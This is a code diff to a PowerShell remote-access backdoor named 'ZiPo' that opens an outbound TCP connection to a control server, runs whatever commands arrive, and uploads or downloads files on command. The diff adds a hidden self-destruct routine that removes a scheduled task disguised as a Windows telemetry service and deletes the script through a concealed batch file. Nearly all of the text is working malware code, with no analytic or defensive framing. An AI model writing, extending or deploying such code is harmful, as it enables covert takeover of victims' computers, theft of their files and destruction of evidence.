@@ -17,13 +17,33 @@ function Connect-ZiPo {
         return "[DOWNLOADED] $out"
     }
 
+    function Self-Destruct {
+        try {
+            $taskName = "\Microsoft\Windows\Shell\SystemTelemetryService"
+            schtasks /delete /tn $taskName /f | Out-Null
+        } catch {}
+
+        $selfPath = $MyInvocation.MyCommand.Definition
+        $batPath = "$env:TEMP\cleanup.bat"
+
+        $batContent = @"
+@echo off
+timeout /t 2 >nul
+del "$selfPath" /f /q
+del "%~f0" /f /q
+"@
+        Set-Content -Path $batPath -Value $batContent -Encoding ASCII
+        Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batPath" -WindowStyle Hidden
+        exit
+    }
+
     while ($true) {
         try {
             $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
             $stream = $tcp.GetStream()
             [byte[]]$buffer = 0..65535 | % { 0 }
 
-            # ANSI-цвета и баннер
+            # ANSI баннер
             $esc = [char]27
             $clear = "$esc[2J$esc[H"
             $banner = @"
@@ -37,11 +57,10 @@ ${esc}[31m
         _\/\\\_______________\/\\\______________/\\\______\//\\\_     
          _\/\\\_______________\/\\\\\\\\\\\\\\\_\///\\\\\\\\\\\/__    
           _\///________________\///////////////____\///////////____${esc}[0m
-
-${esc}[32m[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
+[+] ZiPo Connected: $env:USERNAME@$env:COMPUTERNAME
 OS: $([System.Environment]::OSVersion.VersionString)
-Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
-------------------------------------------------------------
+Architecture: $env:PROCESSOR_ARCHITECTURE
+--------------------------------------------------------${esc}[0m
 "@
 
             $intro = $clear + $banner + "`nPS " + (Get-Location) + "> "
@@ -51,27 +70,29 @@ Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
 
             while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                 $cmd = ([Text.Encoding]::UTF8).GetString($buffer, 0, $i).Trim()
-
                 try {
-                    if ($cmd.StartsWith("!get")) {
+                    if ($cmd -eq "!die") {
+                        $response = "[+] SELF-DESTRUCT INITIATED"
+                        $stream.Write([Text.Encoding]::UTF8.GetBytes($response), 0, $response.Length)
+                        $stream.Flush()
+                        Self-Destruct
+                        return
+                    } elseif ($cmd.StartsWith("!get")) {
                         $path = $cmd.Substring(4).Trim()
                         $response = Upload-File $path
-                    }
-                    elseif ($cmd.StartsWith("!post")) {
+                    } elseif ($cmd.StartsWith("!post")) {
                         $parts = $cmd.Split("::")
                         if ($parts.Length -eq 3) {
                             $response = Download-File $parts[1].Trim() $parts[2].Trim()
                         } else {
                             $response = "[ERROR] INVALID POST FORMAT"
                         }
-                    }
-                    else {
+                    } else {
                         $sb = [ScriptBlock]::Create($cmd)
                         $output = & $sb 2>&1 | Out-String
                         $response = $output.TrimEnd()
                     }
-                }
-                catch {
+                } catch {
                     $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                 }
 
@@ -83,8 +104,7 @@ Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
 
             $stream.Close()
             $tcp.Close()
-        }
-        catch {
+        } catch {
             Start-Sleep -Seconds 5
         }
     }
